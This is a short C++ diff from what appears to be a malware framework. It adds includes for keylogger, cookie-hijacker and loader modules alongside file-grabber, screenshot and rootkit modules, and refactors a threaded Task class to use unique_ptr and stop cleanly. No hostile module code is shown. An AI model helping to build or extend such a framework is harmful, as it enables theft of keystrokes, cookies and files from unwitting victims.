@@ -5,6 +5,9 @@
 #include "BaseModule.h"
 #include "../Modules/FileGrabber.h"
 #include "../Modules/Screenshot.h"
+#include "../Modules/Loader.h"
+#include "../Modules/KeyLogger.h"
+#include "../Modules/CookieHijacker.h"
 #include "../Modules/Rootkit.h"
 
 using supported_modules = supported_modules_enum;
@@ -13,32 +16,33 @@ class Task
 {
 private:
     std::thread task;
-    //std::unique_ptr<BaseModule> m; /* m must be declared as pointer because its a pure virtual class */
-    BaseModule * m;
+    std::unique_ptr<BaseModule> m; /* m must be declared as pointer because its a pure virtual class */
 
 public:
     Task(const Task &) = delete;
 
-    Task(BaseModule * module_base) : m(module_base/*std::unique_ptr<BaseModule>(module_base)*/)
+    Task(BaseModule * module_base) : m(module_base)
     { 
         /* */
     };
 
     ~Task()
     {
-        /*
-        */
+        stop();
     };
 
     void run()
     {
-        task = std::thread(&BaseModule::run, m);
-        
+        if(m.get())
+        {
+            std::cout << "running thread";
+            task = std::thread(&BaseModule::run, m.get());
+        }        
     }
 
     void stop()
     {
-        if (task.joinable())
+        if (task.joinable() && m.get())
         {
             m->stop();
             task.join();
